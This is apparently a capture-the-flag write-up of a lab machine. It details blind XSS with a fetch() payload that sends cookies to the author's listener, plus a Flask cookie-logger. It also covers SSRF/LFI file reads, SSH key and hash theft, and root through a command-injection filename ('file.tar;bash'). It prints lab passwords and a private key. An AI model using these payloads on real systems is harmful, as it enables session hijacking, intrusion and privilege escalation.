# Blind XSS
I was able to trigger some blind XSS in the report a bug section. Using the following payload
```shell
`<img src="x" onerror="fetch('http://10.10.14.12:8000/log?cookie=' + document.cookie)">`
```
I was able to get the cookie to my server which I setup using the following:
#### App.py
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return "Hello, world!"

@app.route('/log', methods=['GET'])
def log():
    data = request.args.get('cookie')
    print(f"Received cookie: {data}")
    with open("cookies.txt", "a") as file:
        file.write(f"{data}\n")
    return "Data received"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

```
And then Ran it:
```shell
python3 app.py
```
Then once that was up and running I executed the payload
![[Pasted image 20240428112707.png]]

## Obtaining the Cookie
```shell
└─$ python3 app.py
 * Serving Flask app 'app'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.17.128:8000
Press CTRL+C to quit
10.10.11.15 - - [28/Apr/2024 05:04:45] "GET /test HTTP/1.1" 404 -
Received cookie: user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4

```

# Bypassing authentication
Using the cookie I was able to log into the dashboard.comprezzor.htb subdomain
![[Pasted image 20240428112829.png]]

# Another Cookie ?
Trying to call back to my server showed that I could get another cookie
![[Pasted image 20240428125208.png]]

### Attack Host
```shell
└─$ nc -lvnp 8000  
listening on [any] 8000 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.15] 58218
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.14.12:8000
User-Agent: Python-urllib/3.11
Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
Connection: close

```

Using the new cookie allows me to access the admin portal
![[Pasted image 20240428125331.png]]



#  CVE-2023–24329
So in the admin create report you can trigger a LFI because of the space character
![[Pasted image 20240428174955.png]]
This is due to the python version being used. This allowed us to read the /etc/passwd file
![[Pasted image 20240428175025.png]]

## Source code
I was able to find the source code directory by using the following commands
```shell
file:///proc/self/cmdline

```
This told me the directory in which the code was stored. I retrieved it
```shell
                   file:///app/code/app.py
```
![[Pasted image 20240428175932.png]]```

```
import dashboard_bp
app = Flask(__name__) app.secret_key = "7ASS7ADA8RF3FD7" app.config['SERVER_NAME'] = 'comprezzor.htb'
```

The top part of the file shows some more interesting files:
```txt
                 file:///app/code/blueprints/dashboard/dashboard.py
```
(user='ftp_admin', passwd='u3jai8y71s2')

# FTP files
Using the ftp files and the SSRF I was able to list out what was in the ftp server
```shell
              ftp://ftp_admin:u3jai8y71s2@ftp.local/
```
![[Pasted image 20240428181906.png]]
## Private Key
Using the command:
```
              ftp://ftp_admin:u3jai8y71s2@ftp.local/{private_key}

```
I was able to get the private key
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA
KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7
x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR
BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX
U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk
TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+
efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc
JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec
80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT
ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V
YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA
bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia
R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7
cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT
9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz
YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa
lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO
JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu
r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk
wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh
FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/
Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW
1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu
eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3
NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ
XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4
AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA
rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N
KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P
bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI
9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl
nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW
ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu
nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6
XxwXArPr6+HQe9hZSjI2hjYC2OU= 
-----END OPENSSH PRIVATE KEY-----
```

# New SSH key
Create a new ssh key with that passphrase and the id_rsa
```shell
└─$ ssh-keygen -p -P "Y27SH19HDIWD" -N "hack123" -m pem -f id_rsa 
Key has comment 'dev_acc@local'
Your identification has been saved with the new passphrase.

```

# We in !
And we are in !!
```shell
└─$ ssh -i id_rsa dev_acc@10.10.11.15                           
Enter passphrase for key 'id_rsa': 

```

# Users.db
Running linspeas I was able to find this file
```shell
dev_acc@intuition:/tmp$ cat /var/www/app/blueprints/auth/users.db
����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�3�EtableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'user'
,�,##w��h�=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh�=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
������
��am    users
```

#### Hashes.txt
```txt
sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43
```

#### Cracked
```text

└─$ hashcat -m 30120 hashes.txt /usr/share/wordlists/rockyou.txt
sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray

```


# Selenium
So there was a few interesting ports open on the linux box:
```shell
dev_acc@intuition:~$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 172.21.0.1:21           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44591         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -          
```

I first port forwarded the 4444 port using the below command:
```shell
─$ ssh -L 4444:localhost:4444 -N -f -i id_rsa dev_acc@10.10.11.15
```

## Nmap
```shell
└─$ nmap -p 4444 -A localhost                                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 01:23 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000087s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
4444/tcp open  krb524?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     content-length: 163
|     connection: close
|     "value": {
|     "message": "Unable to find handler for (GET) u002fnice ports,u002fTrinity.txt.bak",
|     "error": "unknown command",
|     "stacktrace": ""
|   GetRequest: 
|     HTTP/1.1 302 Found
|     content-length: 0
|     Location: /ui/
|     connection: close
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     content-length: 135
|     connection: close
|     "value": {
|     "message": "Unable to find handler for (OPTIONS) u002f",
|     "error": "unknown command",
|     "stacktrace": ""
|   Help, Kerberos, LPDString, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-length: 15
|     connection: close
|     Request
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     content-length: 135
|     "value": {
|     "message": "Unable to find handler for (OPTIONS) u002f",
|     "error": "unknown command",
|_    "stacktrace": ""
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.94SVN%I=7%D=4/29%Time=662F2EC6%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,4C,"HTTP/1\.1\x20302\x20Found\r\ncontent-length:\x200\r\nLo
SF:cation:\x20/ui/\r\nconnection:\x20close\r\n\r\n")%r(SSLSessionReq,52,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-length:\x2015\r\nconnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,52,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\ncontent-length:\x2015\r\nconnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(SSLv23SessionReq,52,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\ncontent-length:\x2015\r\nconnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,C9,"HTTP/1\.1\x20404\x20N
SF:ot\x20Found\r\ncontent-length:\x20135\r\nconnection:\x20close\r\n\r\n{\
SF:n\x20\x20\"value\":\x20{\n\x20\x20\x20\x20\"message\":\x20\"Unable\x20t
SF:o\x20find\x20handler\x20for\x20\(OPTIONS\)\x20\\u002f\",\n\x20\x20\x20\
SF:x20\"error\":\x20\"unknown\x20command\",\n\x20\x20\x20\x20\"stacktrace\
SF:":\x20\"\"\n\x20\x20}\n}")%r(RTSPRequest,B6,"HTTP/1\.1\x20404\x20Not\x2
SF:0Found\r\ncontent-length:\x20135\r\n\r\n{\n\x20\x20\"value\":\x20{\n\x2
SF:0\x20\x20\x20\"message\":\x20\"Unable\x20to\x20find\x20handler\x20for\x
SF:20\(OPTIONS\)\x20\\u002f\",\n\x20\x20\x20\x20\"error\":\x20\"unknown\x2
SF:0command\",\n\x20\x20\x20\x20\"stacktrace\":\x20\"\"\n\x20\x20}\n}")%r(
SF:Help,52,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-length:\x2015\r\
SF:nconnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCo
SF:okie,52,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-length:\x2015\r\
SF:nconnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,52,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\ncontent-length:\x2015\r\nconnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,E5,"HTTP/1
SF:\.1\x20404\x20Not\x20Found\r\ncontent-length:\x20163\r\nconnection:\x20
SF:close\r\n\r\n{\n\x20\x20\"value\":\x20{\n\x20\x20\x20\x20\"message\":\x
SF:20\"Unable\x20to\x20find\x20handler\x20for\x20\(GET\)\x20\\u002fnice\x2
SF:0ports,\\u002fTrinity\.txt\.bak\",\n\x20\x20\x20\x20\"error\":\x20\"unk
SF:nown\x20command\",\n\x20\x20\x20\x20\"stacktrace\":\x20\"\"\n\x20\x20}\
SF:n}")%r(LPDString,52,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-leng
SF:th:\x2015\r\nconnection:\x20close\r\n\r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.09 seconds

```

![[Pasted image 20240429062710.png]]


# FTP access
Why did I not think to use the creds from the hashcat to login to the ftp service running.
```shell
dev_acc@intuition:~$ ftp adam@127.0.0.1
Connected to 127.0.0.1.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get run-tests.sh
local: run-tests.sh remote: run-tests.sh
229 Entering extended passive mode (|||35595|).
125 Data connection already open. Transfer starting.
100% |**********************************************************************************************|   318      411.86 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (344.28 KiB/s)
ftp> get runner1
local: runner1 remote: runner1
229 Entering extended passive mode (|||44803|).
125 Data connection already open. Transfer starting.
100% |**********************************************************************************************| 16744       26.04 MiB/s    00:00 ETA
226 Transfer complete.
16744 bytes received in 00:00 (18.24 MiB/s)
ftp> get runner1.c
local: runner1.c remote: runner1.c
229 Entering extended passive mode (|||52987|).
150 File status okay. About to open data connection.
100% |**********************************************************************************************|  3815        3.28 MiB/s    00:00 ETA
226 Transfer complete.


```

# Runner1.c
The runner1.c file has a hardcoded md5 hash
```c
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

```
But what is interesting is that in the run-tests.sh file there is what looks like half a key
```c
dev_acc@intuition:~$ cat run-tests.sh 
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"

```

## Hashcat with a mask
Using hashcat with the md5 hash and a mask for the remainder of the letters I was able to crack the hash
```shell
─$ hashcat -m 0 -a 3 md5_hash.txt UHI75GHI?u?u?u?u

0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP             
                                                          
Session..........: hashcat
Status...........: Cracked

```

# Lopez
Just looking around the file system I found something interesting in the var/log folder and I was able to find some creds
```shell
zgrep -i lopez /var/log/suricata/*.gz
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:43:36.099184+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:43:52.999165+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"PASS","command_data":"Lopezzz1992%123","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:44:32.133372+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
/var/log/suricata/eve.json.7.gz:{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}

```

## Access
```shell
dev_acc@intuition:~$ su lopez
Password: 
lopez@intuition:/home/dev_acc$ 

```
# Root
To get root you first check the sudo privs
```shell
sudo -l
User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2

```

Then you need to decompile that binary
![[Pasted image 20240429120530.png]]
![[Pasted image 20240429120541.png]]
![[Pasted image 20240429120550.png]]

## Exploit.json
Since the rule name is vulnerable to command injection you can rename a .tar file to 'file;bash' and make your json file look like this
```json
{
  "run":{
        "action":"install",
        "role_file":"file.tar;bash"
        },
  "auth_code":"UHI75GHINKOP"
}

```

```shell
lopez@intuition:~$ ls
 disassembly.txt   exploit2.json   exploit.json  'file.tar;bash'
```

# Run it
```shell
lopez@intuition:~$ sudo /opt/runner2/runner2 exploit.json
Starting galaxy role install process
whoami
[WARNING]: - file.tar was NOT installed successfully: Unknown error when attempting to call Galaxy at 'https://galaxy.ansible.com/api/':
<urlopen error [Errno -3] Temporary failure in name resolution>
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
root@intuition:/home/lopez# whoami
root

```